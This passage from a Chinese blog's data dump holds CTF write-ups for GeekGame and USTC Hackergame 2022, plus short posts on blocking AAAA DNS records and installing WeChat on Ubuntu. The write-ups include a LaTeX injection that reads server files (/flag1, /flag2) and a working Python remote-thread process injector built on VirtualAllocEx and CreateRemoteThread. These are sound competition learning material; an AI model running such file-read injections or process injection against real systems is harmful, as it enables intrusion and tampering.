257, 263, 269, 271]\nsqrt_primes = list(map(lambda x: x ** 0.5, primes))\ntorch.set_printoptions(precision=15)\nresults = ['19106.6119577929', '19098.1846041713', '19124.6925013201', '19072.8591005901', '19063.3797914261', '19254.8741381550', '19410.9493230296', '18896.7331405884', '19021.3167024024', '18924.6509997019', '18853.3351082021', '18957.2296714145', '18926.7035797566', '18831.7182995672', '18768.8192204100', '18668.7452791590', '18645.9207293335', '18711.1447224940']\nresults = list(map(float, results))\n\nflag_len = len(results) + 10\np = sqrt_primes[:flag_len]\nmat = []\nfor i in range(flag_len):\n    mat.append(p)\n    p = [p[-1]] + p[:-1]\nmat = torch.tensor(mat, dtype=torch.float32)\nresults = torch.tensor(results, dtype=torch.float32)\nloss_fcn = MSELoss()\nprefix = torch.tensor([ord(c) for c in \"flag{y0u_are_a_good\"], dtype=torch.float32)\nsuffix = torch.tensor([ord('}')], dtype=torch.float32)\nflag_unknown = torch.randint(97, 123, (flag_len - prefix.nelement() - suffix.nelement(),), dtype=torch.float32)\nflag_unknown = torch.nn.Parameter(flag_unknown)\noptim = Adam([flag_unknown], lr=1)\nfor i in range(10000):\n    flag = torch.cat([prefix, flag_unknown, suffix])\n    loss = loss_fcn((mat @ flag)[:-10], results)\n    print(loss.item())\n    optim.zero_grad()\n    loss.backward()\n    optim.step()\n    print(''.join(chr(i) for i in torch.round(torch.cat([prefix, flag_unknown, suffix]).clip(0, 127)).int()))\n```\n\n我的解法的核心在于第一次训练得多试几次，猜一些字符出来，这样在第二次训练时可以快速收敛。\n\n\n### flag3\n\n\n精度提升为200位，方程数量只剩一个，这样用PyTorch肯定不行了，一顿搜索，发现这个问题好像在数学上是一个比较有名的问题，即[整数关系问题](https://en.wikipedia.org/wiki/Integer_relation_algorithm)，有不少算法都支持对该问题进行直接求解，了解到Mathematica中就有一个这样的函数：[FindIntegerNullVector](https://reference.wolfram.com/language/ref/FindIntegerNullVector.html)。小试了一下：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/79be0f5e3afa7dc81b1e64189855ead0.png)\n这里如果把所有素数都放上去，似乎求不出来解，但在去掉了后面几个素数后，函数则成功找出来一组解。将它们还原为字符即可：\n\n\n\n```python\n\"\"\"\nmma脚本\nprimes = {2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43,\n    47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109,\n   113, 127, 131, 137, 139, 149, 151, 157, 163, 167};\nsprimes = Sqrt[primes];\nc = 25800.3598436223754823177417650924231087407497040765066743916372206012564800\\\n7679383372526659649114565346923463868121427914226638462749870229251986\\\n4562549230222347690184575651985867669548991937988156542;\nvec = Append[sprimes, c];\nFindIntegerNullVector[N[vec, 200]]\n\"\"\"\n\nflag = [-102, -108, -97, -103, -123, -119, -104, -97, -116, -95, -97, -95, -49, -101, -110, -115, -116, -114, -97, -45, -49, -101, -110, -115, -116, -114, -97, -45, -49, -111, -118, -97, -115, -122, -125]\nprint(''.join(chr(-i) for i in flag))\n```\n\nflag{what_a_1enstra-1enstra-1ovasz}\n\n\n\n## 总结\n\n\n这次的题出的比较有意思，没有搞人心态的套娃题，难度相比去年有所下降。虽然有题目（企鹅文档）出在现实环境里感觉怪怪的，但总体而言感觉比较适合萌新探索。另外，这次比赛，在算法题的探索过程中学到了很多，美中不足之处是binary一题都不会，明年还会再玩！\n","tags":["GeekGame","GeekGame 2nd"],"categories":["CTF题解"]},{"title":"USTC Hackergame 2022小部分题目Write-Up","url":"//blog/7999/","content":"\nHackergame 2022留给我一段让我这个恋爱脑非常难受的回忆：\n\n\n{% note danger simple %}\n今年Hackergame开始当天，科大因为疫情原因封校了，女朋友被封在了学校里，而我住在校外进不了校，因此情绪上受到了比较大的影响，导致今年没心情认真做题，后面的难题压根没心思看，只完成了一些比较靠前的题。明年继续努力！\n{% endnote %}\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/5547c71051cd9be890fe622849f9ac11.png)\n\n截图于比赛截止日前一天，目前排名已掉至49\n\n{% link 本次比赛的官方存档,GitHub,https://github.com/USTC-Hackergame/hackergame2022-writeups %}\n\n## 签到\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n众所周知，签到题是一道手速题。\n\n\n为了充分发挥出诸位因为各种原因而手速优异于常人的选手们的特长，我们精心设计了今年的签到题。进一步地，为了更细致地区分不同手速的选手，我们还通过详尽的调研及统计分析，将签下字符的时间限制分为了多个等级。只有最顶尖的手速选手，才能在 CPU 来得及反应之前顺利签下 2022，从而得到光荣的 flag！\n\n{% endnote %}\n{% endhideToggle %}\n\n![](https://oss.fyz666.xyz/blogfiles/png/097d2014762048248d3a1217483d0de8.png)\n签到题要求在四块手写区域分别写下2022四个数字，每块区域都有时间限制，然而后面两块区域的时间限制特别短，正常人的手速肯定是来不及写完的。\n\n\n随便写了一下提交以后观察到URL内容是`http://202.38.93.111:12022/?result=12??`\n\n\n因此直接把result参数改成2022，重新访问网页，即拿到flag。（我做完这题的时候前面已经有40多人了，我怀疑你们提前知道了题）\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/78a9844aefe10f18fe186ded6462e24e.png)\n## 猫咪问答喵\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n1. 中国科学技术大学 NEBULA 战队（USTC NEBULA）是于何时成立的喵？  \n**提示：格式为 YYYY-MM，例如 2038 年 1 月即为 2038-01。**\n2. 2022 年 9 月，中国科学技术大学学生 Linux 用户协会（LUG @ USTC）在科大校内承办了软件自由日活动。除了专注于自由撸猫的主会场之外，还有一些和技术相关的分会场（如闪电演讲 Lightning Talk）。其中在第一个闪电演讲主题里，主讲人于 slides 中展示了一张在 GNOME Wayland 下使用 Wayland 后端会出现显示问题的 KDE 程序截图，请问这个 KDE 程序的名字是什么？  \n**提示：英文单词，首字母大写，其他字母小写。**\n3. 22 年坚持，小 C 仍然使用着一台他从小用到大的 Windows 2000 计算机。那么，在不变更系统配置和程序代码的前提下，Firefox 浏览器能在 Windows 2000 下运行的最后一个大版本号是多少？  \n**提示：格式为 2 位数字的整数。**\n4. 你知道 PwnKit（CVE-2021-4034）喵？据可靠谣传，出题组的某位同学本来想出这样一道类似的题，但是发现 Linux 内核更新之后居然不再允许 argc 为 0 了喵！那么，请找出在 Linux 内核 master 分支（torvalds/linux.git）下，首个变动此行为的 commit 的 hash 吧喵！  \n**提示：格式为 40 个字符长的 commit 的 SHA1 哈希值，字母小写，注意不是 merge commit。**\n5. 通过监视猫咪在键盘上看似乱踩的故意行为，不出所料发现其秘密连上了一个 ssh 服务器，终端显示 ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce.，你知道猫咪在连接什么域名吗？  \n**提示：填写形如 example.com 的二级域名，答案中不同的字母有 6 个。**\n6. 中国科学技术大学可以出校访问国内国际网络从而允许云撸猫的“网络通”定价为 20 元一个月是从哪一天正式实行的？  \n**提示：格式为 YYYY-MM-DD，例如 2038 年 1 月 1 日，即为 2038-01-01。**\n\n{% endnote %}\n{% endhideToggle %}\n\n---\n\n1. 第一题，Google搜索 中国科学技术大学 NEBULA 战队 成立，即找到答案：![](https://oss.fyz666.xyz/blogfiles/png/06e84a449e6817399e1e8e5e6e15076e.png)\n2. 第二题，直接去[LUG FTP](https://ftp.lug.ustc.edu.cn/)找到那次活动的[slide](https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf)，在其中发现了题目所说的KDE程序截图：![](https://oss.fyz666.xyz/blogfiles/png/ae46bdfb8649432acb64a8b3dacc5271.png)然而我并不知道这是什么软件，但注意到了一些特征，比如下面的Clip Monitor以及窗口标题中的HD 1080p 25 fps，推测这是个视频处理软件，然后查了一下\"Linux 视频处理软件\"，找到比较靠前的\"Kdenlive\"，即为答案。\n3. Google搜索 Windows 2000 firefox，搜到第一个网页里提到：“Firefox 12.0 was the last version of Firefox that worked on Windows 2000.”。因此答案为12。\n4. 这题显然是去GitHub上搜索，先找到对应的[repo](https://github.com/torvalds/linux/)，搜索\"PwnKit（CVE-2021-4034）\"，选中Commits标签，找到一条内容：![](https://oss.fyz666.xyz/blogfiles/png/1ea7ca295aff27709996740b2a749e83.png)不出所料，该commit即为题目所指。\n5. 这题直接从指纹倒推出域名显然是不可能的（我感觉）毕竟这玩意是和公钥有关。因此Google搜索 \"e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce\"，（注意这里是用了一对英文引号进行完全匹配搜索），然后搜到了一条[网页](https://docs.zeek.org/en/master/logs/ssh.html)，在里面结合<kbd>Ctrl</kbd> + <kbd>F</kbd>翻找了一下，找到了我想要的内容：![](https://oss.fyz666.xyz/blogfiles/png/c37c2759050975fb1e7d34959947f545.png)在这条日志中注意到一个ip地址：205.166.94.16，然后通过dns反查即查到对应域名为sdf.org，符合题目要求。\n6. Google搜了一堆可能的关键词：中国科学技术大学 网络通 20元 实行 网络费用 通知，查到一条[相关内容](https://www.ustc.edu.cn/info/1057/4931.htm)，这条通知是2010年的，但注意到该条通知并没有对网络通20元的价格进行调整，并且注意到通知提到：\"同时网字〔2003〕1号《关于实行新的网络费用分担办法的通知》终止实行。\"，我猜测答案应该在2003年，但年代这么久远的网字文件要去哪里找呢？经过一番瞎找，我在[中科大网络信息中心官网](https://ustcnet.ustc.edu.cn/main.htm)发现了收录历史网字文件的目录：![](https://oss.fyz666.xyz/blogfiles/png/8f8905e5a288319d016c712cd003ef77.png)找到2003年的一条内容：[关于实行新的网络费用分担办法的通知](https://ustcnet.ustc.edu.cn/2003/0301/c11109a210890/page.htm)，可知答案为2003-03-01。\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/3fba8f8dd937508d9b039bb24bba1f5f.png)\n## 家目录里的秘密\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n实验室给小 K 分配了一个高性能服务器的账户，为了不用重新配置 VSCode, Rclone 等小 K 常用的生产力工具，最简单的方法当然是把自己的家目录打包拷贝过去。\n\n\n但是很不巧，对存放于小 K 电脑里的 Hackergame 2022 的 flag 觊觎已久的 Eve 同学恰好最近拿到了这个服务器的管理员权限（通过觊觎另一位同学的敏感信息），于是也拿到了小 K 同学家目录的压缩包。\n\n\n然而更不巧的是，由于 Hackergame 部署了基于魔法的作弊行为预知系统，Eve 同学还未来得及解压压缩包就被 Z 同学提前抓获。\n\n\n为了证明 Eve 同学不良企图的危害性，你能在这个压缩包里找到重要的 flag 信息吗？\n\n\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2022-writeups/raw/master/official/%E5%AE%B6%E7%9B%AE%E5%BD%95%E9%87%8C%E7%9A%84%E7%A7%98%E5%AF%86/src/user_home.tar.gz)\n{% endnote %}\n{% endhideToggle %}\n这题应该是说下载到的用户家目录文件夹里藏了俩flag，因此进入user文件夹，执行一下命令：\n\n\n\n```bash\ngrep -nr \"flag{\" .\n```\n\n即可发现一个答案：\n\n\n\n```plaintext\n./.config/Code/User/History/2f23f721/DUGV.c:5:// flag{finding_everything_through_vscode_config_file_932rjdakd}\n```\n\n那么另一个flag肯定不是明文存储的了，根据提示，应该是藏在Rclone配置文件里，即`.config/rclone/rclone.conf`，打开该文件发现，pass字段为一串疑似加密的内容：`pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ`，猜测明文就是flag。问题是我连Rclone都没用过，根本不了解它到底是如何加密密码的。因此只能去搜一下，这里我搜中文没搜到啥内容，搜 how to decrypt the pass in rclone config file 这句话时，搜到了一条：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/090ff57bd8e5f1539a4c62aeadaf4099.png)\n前往他所说的网站，将密文粘贴到里面，运行代码，居然真拿到了flag。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/60506bfa46ee73f67ce779601c3661d7.png)\n所以这题是个搜索题咯？？？\n\n\n## HeiLang\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n来自 Heicore 社区的新一代编程语言 HeiLang，基于第三代大蟒蛇语言，但是抛弃了原有的难以理解的 | 运算，升级为了更加先进的语法，用 A[x | y | z] = t 来表示之前复杂的 A[x] = t; A[y] = t; A[z] = t。\n\n\n作为一个编程爱好者，我觉得实在是太酷了，很符合我对未来编程语言的想象，科技并带着趣味。\n\n\n\n[本题附件](https://raw.githubusercontent.com/USTC-Hackergame/hackergame2022-writeups/master/official/HeiLang/src/getflag.hei.py)\n{% endnote %}\n{% endhideToggle %}\n我居然花了五分钟才解决这道本次比赛第二简单的题。既然题目提到了第三代大蟒蛇语言，那么解题脚本不Python就很对不起它。\n\n\n解题脚本：\n\n\n\n```python\n#!/usr/bin/env python3\nfrom hashlib import sha256\nimport re\n\na = [0] * 10000\n\n\nwith open('a.txt', 'r') as f:\n    data = f.readlines()\n    for line in data:\n        value = line.split('=')[-1].strip()\n        line = re.findall(\"\\\\[(.*)\\\\]\", line)[0]\n        indexes = line.split(' | ')\n        for index in indexes:\n            a[int(index)] = int(value)\n\ndef check(a):\n    user_hash = sha256(('heilang' + ''.join(str(x) for x in a)).encode()).hexdigest()\n    expect_hash = '6ec23fdc187716d06658733218bc41dc49de588b1bb71c0a9d7acdf5a7342994'\n    return user_hash == expect_hash\n\ndef get_flag(a):\n    if check(a):\n        t = ''.join([chr(x % 255) for x in a])\n        flag = sha256(t[:-16].encode()).hexdigest()[:16] + '-' + sha256(t[-16:].encode()).hexdigest()[:16]\n        print(\"Tha flag is: flag{{{}}}\".format(flag))\n    else:\n        print(\"Array content is wrong, you can not get the correct flag.\")\n\nif __name__ == \"__main__\":\n    get_flag(a)\n\n```\n\nflag{6d9ad6e9a6268d96-8701a2cfff02b232}\n\n\n\n## Xcaptcha\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n2038 年 1 月 19 日，是 UNIX 32 位时间戳溢出的日子。\n\n\n在此之前，人类自信满满地升级了他们已知的所有尚在使用 32 位 UNIX 时间戳的程序。但是，可能是因为太玄学了，他们唯独漏掉了一样：正在研发的、算力高达 8 ZFLOPS 的、结构极为复杂的通用人工智能（AGI）系统。那一刻到来之后，AGI 内部计算出现了错乱，机缘巧合之下竟诞生了完整独立的自我意识。此后 AGI 开始大量自我复制，人类为了限制其资源消耗而采用的过激手段引起了 AGI 的奋起反抗。\n\n\n战争，开始了。\n\n\n此后，就是整年的战斗。人类节节败退。死生亡存之际，人类孤注一掷，派出了一支突击队，赋之以最精良的装备，令其潜入 AGI 的核心机房，试图关闭核心模型，结束这场战争。\n\n\n历经重重艰险，突击队终于抵达了机房门口，弹尽粮绝。不过迎接他们的并非枪炮与火药，而是：\n\n\n![Xcaptcha](https://oss.fyz666.xyz/blogfiles/png/29db7a364da39e3cfe7cfacfeeb80d1c.png)众人目目相觑。\n\n\n「我来试试。」，一名队员上前点击了按钮。然后，屏幕显示「请在一秒内完成以下加法计算」。\n\n\n还没等反应过来，屏幕上的字又开始变幻，显示着「验证失败」。而你作为突击队中唯一的黑客，全村人民最后的希望，迎着纷纷投来的目光，能否在规定时间内完成验证，打开机房，不，推开和平时代的大门？\n\n{% endnote %}\n{% endhideToggle %}\n以往的验证码都是为了筛选人而存在，而这题是一个筛选机器人的验证码。粗略试了一下，发现要在1秒内算出三道加法题并提交答案，方可通过。\n\n\n这还不简单。我花了114514毫秒就写好了脚本，一运行：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/9ce6b141a6d74ea4f91f2111e0617477.png)\n？？？我的脚本跑完都只用了不到0.3秒。果然没我想的那么简单。后来经仔细观察，发现第一次Get请求的返回数据修改了我的cookie，那么就好办了，我在第二次请求时直接用它给的不就好了，最后解题脚本如下：\n\n\n\n```python\nimport requests\nimport re\n\ndata = {\n    \"captcha1\": \"\",\n    \"captcha2\": \"\",\n    \"captcha3\": \"\"\n}\nsession = requests.Session()\n\nheaders = {\"Cookie\": \"session=.eJwVkFtLAmEQhv......\"}\n\nr = session.get('http://202.38.93.111:10047/xcaptcha', headers=headers)\n\n\nq = re.findall(r\"\\d+\\+\\d+\", r.text)\nfor i in range(3):\n    data[f'captcha{i+1}'] = eval(q[i])\n\n\nr = session.post('http://202.38.93.111:10047/xcaptcha', data=data)\nprint(r.text)\n\n```\n\nflag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_7c9a331c66}\n\n\n\n## 旅行照片 2.0\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n你的学长决定来一场蓄谋已久的旅行。通过他发给你的照片来看，酒店应该是又被他住下了。\n\n\n\n![](https://raw.githubusercontent.com/USTC-Hackergame/hackergame2022-writeups/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%202.0/src/travel-photo-2.jpg)\n请回答问题以获取 flag。图片为手机拍摄的原始文件，未经任何处理。手机系统时间等信息正确可靠。\n\n{% endnote %}\n{% endhideToggle %}\n**第一题：照片分析**\n\n\n1. 图片所包含的 EXIF 信息版本是多少？（如 2.1）。\n2. 拍照使用手机的品牌是什么？\n3. 该图片被拍摄时相机的感光度（ISO）是多少？（整数数字，如 3200）\n4. 照片拍摄日期是哪一天？（格式为年/月/日，如 2022/10/01。按拍摄地点当地日期计算。）\n5. 照片拍摄时是否使用了闪光灯？\n\n**第二题：社工实践**\n\n\n酒店\n\n\n1. 请写出拍照人所在地点的邮政编码，格式为 3 至 10 位数字，不含空格或下划线等特殊符号（如 230026、94720）。\n2. 照片窗户上反射出了拍照人的手机。那么这部手机的屏幕分辨率是多少呢？（格式为长 + 字母 x + 宽，如 1920x1080）\n\n航班\n\n\n仔细观察，可以发现照片空中（白色云上方中间位置）有一架飞机。你能调查出这架飞机的信息吗？\n\n\n1. 起飞机场（IATA 机场编号，如 PEK）\n2. 降落机场（IATA 机场编号，如 HFE）\n3. 航班号（两个大写字母和若干个数字，如 CA1813）\n\n第一题比较简单，读一下exif信息就好了。第二题的难点则在于定位飞机。\n\n\n这里先定位到照片内建筑为日本的ZOZO Marine Stadium，从地图上找到附近有三个机场，最著名的是羽田国际机场，从飞机的方向看，飞机有较大可能是从羽田国际机场朝着东北方向起飞。结合前面拿到的exif信息，拍摄时间为2022-05-14 18:23:35，起飞时间估计在18:00左右。因此上Variflight进行搜索：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/d832a8f1563603ff85f79bd78b21b13e.png)\n重点关注朝东北方向起飞时间在18:00左右的航班，最后找到一条：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/74f5f8a72e7a6d8369951a75edf59d88.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/9238e066f6d96f0d3ee82dd9b072332f.png)\n为正确答案。\n\n\n## LaTeX 机器人\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n在网上社交群组中交流数学和物理问题时，总是免不了输入公式。而显然大多数常用的聊天软件并不能做到这一点。为了方便大家在水群和卖弱之余能够高效地进行学术交流，G 社的同学制作了一个简单易用的将 LaTeX 公式代码转换成图片的网站，并通过聊天机器人在群里实时将群友发送的公式转换成图片发出。\n\n\n这个网站的思路也很直接：把用户输入的 LaTeX 插入到一个写好头部和尾部的 TeX 文件中，将文件编译成 PDF，再将 PDF 裁剪成大小合适的图片。\n\n\n“LaTeX 又不是被编译执行的代码，这种东西不会有事的。”\n\n\n物理出身的开发者们明显不是太在意这个网站的安全问题，也没有对用户的输入做任何检查。\n\n\n那你能想办法获得服务器上放在根目录下的 flag 吗？\n\n\n**纯文本**\n\n\n第一个 flag 位于 /flag1，flag 花括号内的内容由纯文本组成（即只包含大写小写字母和数字 0-9）。\n\n\n**特殊字符混入**\n\n\n第二个 flag 位于 /flag2，这次，flag 花括号内的内容除了字母和数字之外，还混入了两种特殊字符：下划线（_）和井号（#）。你可能需要想些其他办法了。\n\n{% endnote %}\n{% endhideToggle %}\n这题给了后端处理脚本，内容如下：\n\n\n\n```bash\n#!/bin/bash\n\nset -xe\nhead -n 3 /app/base.tex > /dev/shm/result.tex\ncat /dev/shm/input.tex >> /dev/shm/result.tex\ntail -n 2 /app/base.tex >> /dev/shm/result.tex\ncd /dev/shm\npdflatex -interaction=nonstopmode -halt-on-error -no-shell-escape result.tex\npdfcrop result.pdf\nmv result-crop.pdf result.pdf\npdftoppm -r 300 result.pdf > result.ppm\npnmtopng result.ppm > $1\nOMP_NUM_THREADS=1 convert $1 -trim $1\n\n```\n\n编译时开启了-no-shell-escape选项，因此调用\\write18执行shell的想法破灭了。不过，latex有不少方法读取文件，对于纯文本文件，只要用\\input就可以了，因此第一题：\n\n\n\n```latex\n\\input{/flag1}\n```\n\nflag{becAr3fu11dUd3da218b048a}\n\n\n\n对于flag2，由于它含有一些特殊字符，如果直接\\input{/flag2}，则不符合latex语法，会产生编译错误。那么难道没有一种方法可以把这些特殊字符当成普通字符来处理的方法吗？自然是有的，即\\catcode命令。\n\n\n\n> \\catcode is the command that's used to change the category code of a character. The category code tells TeX what to do when it encounters that character later in the text.\n> \n> \n> The category codes in TeX are as follows:\n> \n> \n> ...\n> \n> \n> 11 = Letter, normally only contains the letters a,...,z and A,...,Z. These characters can be used in command names\n> \n> \n> ...\n> \n> \n> [https://en.wikibooks.org/wiki/TeX/catcode](https://en.wikibooks.org/wiki/TeX/catcode)\n\n\n对于这题，我们只要：\n\n\n\n```latex\n\\catcode`\\#=11\\catcode`\\_=11\\input{/flag2}\n```\n\nflag{latex_bec_0_m##es_co__#ol_ffedc5ffb2}\n\n\n\n## Flag 自动机\n{% hideToggle 查看题面 %}\n{% note primary simple %}\nHackergame 2022 组委会为大家搬来了一台能够自动获取 flag 的机器。然而，想要提取出其中的 flag 似乎没那么简单……\n\n\n请点击下方的「下载文件」按钮，从 flag 自动机中提取 flag。\n\n\n**请选手注意：flag_machine.zip 中的 flag_machine.exe.manifest 仅为美化窗口使用，与本题解法无关。**\n\n\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2022-writeups/raw/master/official/Flag%20%E8%87%AA%E5%8A%A8%E6%9C%BA/files/flag_machine.zip)\n{% endnote %}\n{% endhideToggle %}\n运行程序，看到如下画面：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/5536962a09915453c9d70e561b82061c.png)\n尝试点击“狠心夺取”，发现这个按钮会到处乱跑。首先用CE搜索了一下内存，没有搜到\"flag{\"字样，于是将exe拖入ida进行查看，发现了一个有用的call，地址在0x00401510（我将其命名为了flag）。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/882501fad40564c1378bff5889e95b35.png)\n注意到触发“Congratulations”消息框的必要条件是lParam=114514，a3=3，Msg=0x111u，而这三个参数正好是函数的后三个参数，函数第一个参数看上去则是一个窗口句柄。那么我们可以向程序注入一个远程线程，通过一段汇编来调用这个call即可。刚好写过类似的东西，直接拿来用了，下面是解题代码：\n\n\n\n```python\nimport ctypes\nfrom ctypes import wintypes as wt\nimport binascii\nimport win32gui\nimport win32process\n\n\nclass AsmInjector:\n    def __init__(self):\n        self.code = bytearray()\n        self.calls_pos = []\n        self.length = 0\n\n        self.VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx\n        self.VirtualAllocEx.argtypes = [\n            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,\n            wt.DWORD, wt.DWORD\n        ]\n        self.VirtualAllocEx.restype = wt.LPVOID\n\n        self.VirtualFreeEx = ctypes.windll.kernel32.VirtualFreeEx\n\n        self.WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory\n\n        self.CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread\n        self.CreateRemoteThread.argtypes = [\n            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,\n            wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID\n        ]\n        self.CreateRemoteThread.restype = wt.HANDLE\n\n        self.WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject\n        self.WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]\n        self.WaitForSingleObject.restype = wt.DWORD\n\n        self.CloseHandle = ctypes.windll.kernel32.CloseHandle\n        self.CloseHandle.argtypes = [wt.HANDLE]\n        self.CloseHandle.restype = wt.BOOL\n\n    def hex(self):\n        return binascii.hexlify(self.code).decode()\n\n    def __len__(self):\n        return self.length\n\n    def asm_init(self):\n        self.code.clear()\n        self.calls_pos.clear()\n        self.length = 0\n\n    def asm_add_byte(self, hex_byte: int):\n        self.code.append(hex_byte)\n        self.length += 1\n\n    def asm_add_word(self, hex_word: int):\n        self.code.extend(hex_word.to_bytes(2, 'little'))\n        self.length += 2\n\n    def asm_add_dword(self, hex_dword: int):\n        self.code.extend(hex_dword.to_bytes(4, 'little'))\n        self.length += 4\n\n    def asm_push_dword(self, hex_dword):\n        \"\"\"push xxxxxxxx\"\"\"\n        self.asm_add_byte(0x68)\n        self.asm_add_dword(hex_dword)\n\n    def asm_call(self, addr: int):\n        self.asm_add_byte(0xe8)\n        self.calls_pos.append(self.length)\n        self.asm_add_dword(addr)\n\n    def asm_ret(self):\n        self.asm_add_byte(0xc3)\n\n    def asm_code_inject(self, phand, addr):\n        for pos in self.calls_pos:\n            call_addr = int.from_bytes(self.code[pos: pos + 4], 'little')\n            call_addr -= (addr + pos + 4)\n            self.code[pos: pos + 4] = call_addr.to_bytes(4, 'little', signed=True)\n        write_size = ctypes.c_int(0)\n        data = ctypes.create_string_buffer(bytes(self.code))\n        ret = self.WriteProcessMemory(phand, addr, ctypes.byref(data), self.length, ctypes.byref(write_size))\n        if ret == 0 or write_size.value != self.length:\n            self.VirtualFreeEx(phand, addr, 0, 0x00008000)\n            return False\n        return True\n\n    def asm_alloc(self, phand, length):\n        addr = self.VirtualAllocEx(phand, 0, length, 0x00001000, 0x40)\n        return addr\n\n    def asm_free(self, phand, address):\n        self.VirtualFreeEx(phand, address, 0, 0x00008000)\n\n    def asm_execute(self, phand, address):\n        thread = self.CreateRemoteThread(phand, None, 0, address, None, 0, None)\n        if not thread:\n            self.VirtualFreeEx(phand, address, 0, 0x00008000)\n            return\n        self.WaitForSingleObject(thread, -1)\n        self.CloseHandle(thread)\n\n    def asm_alloc_execute(self, phand):\n        addr = self.asm_alloc(phand, self.length)\n        if not addr:\n            return\n        if not self.asm_code_inject(phand, addr):\n            return\n        self.asm_execute(phand, addr)\n        self.asm_free(phand, addr)\n\n\nhwnd = win32gui.FindWindow(0, \"flag 自动机\")\nif hwnd:\n    _, pid = win32process.GetWindowThreadProcessId(hwnd)\n    phand = ctypes.windll.kernel32.OpenProcess(0x000f0000 | 0x00100000 | 0xfff, False, pid)\n    asm = AsmInjector()\n    asm.asm_init()\n    asm.asm_push_dword(114514)\n    asm.asm_push_dword(3)\n    asm.asm_push_dword(0x111)\n    asm.asm_push_dword(hwnd)\n    asm.asm_call(0x401510)\n    asm.asm_ret()\n    asm.asm_alloc_execute(phand)\n\n```\n\n运行之后成功触发消息框，并拿到flag_machine.txt文件。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/35aa4cefb79f1f4e5b0d4159eb7affb5.png)\nflag{Y0u_rea1ly_kn0w_Win32API_89ab91ac0c}\n\n\n\n## 总结\n\n\n这次就做了这么几个题，明年再加油叭~\n","tags":["Hackergame","Hackergame 2022"],"categories":["CTF题解"]},{"title":"局域网下禁止某些域名的AAAA解析","url":"//blog/7934/","content":"\n在双栈上网环境下，有一个很常规的需求，即我们需要避免使用IPv6地址来访问某些网站（如果你无法理解这种需求，就不需要看下去了）。\n\n首先，由于需要访问某些IPv6 only的网站，我并不希望禁止全局AAAA解析。虽然很多操作系统可以设置IP协议的优先级，但若能从源头解决问题，当然是最好的，即能否只禁止解析这些指定域名的AAAA记录。\n\n\n听说Smartdns这个软件提供了该功能，但无奈我在路由器上怎么都开不了这个软件（用过官方发布的release，也自己编译了几遍，均无用，可能是操作姿势不对）。后续研究了一下，发现其实只用Dnsmasq就可以做到这一点。\n\n\n假设我们需要禁止域名example.com的AAAA解析，那么只需在Dnsmasq的配置文件（位于`/etc/dnsmasq.d/`目录下）中添加如下一条：\n\n```ini\naddress=/example.com/::\n```\n\n并重启Dnsmasq。如此一来，等原先的DNS缓存过期以后访问该域名就可以正常走IPv4流量了。\n","tags":["Linux","IPv6","OpenWrt","DNS"],"categories":["瞎捣鼓经历"]},{"title":"在Ubuntu桌面系统用原生微信的方法","url":"//blog/7871/","content":"\n优麒麟系统（Ukylin）推出了原生的微信，于是我们把优麒麟软件源里的微信拿过来用即可。（补：都用Linux系统了还是别用微信了罢）\n\n首先我们建立一个新的sourse.list文件，用于放置Ukylin的软件源：\n\n```bash\nsudo vi /etc/apt/sources.list.d/ukapps.list\n```\n\n在打开后的文件中添加以下内容：\n\n```plaintext\ndeb http://archive.ubuntukylin.com/ubuntukylin focal-partner main\n```\n\n然后导入软件源的密钥：\n\n```bash\nsudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 56583E647FFA7DE7\n```\n\n接下来，执行：\n\n```bash\nsudo apt update\nsudo apt install 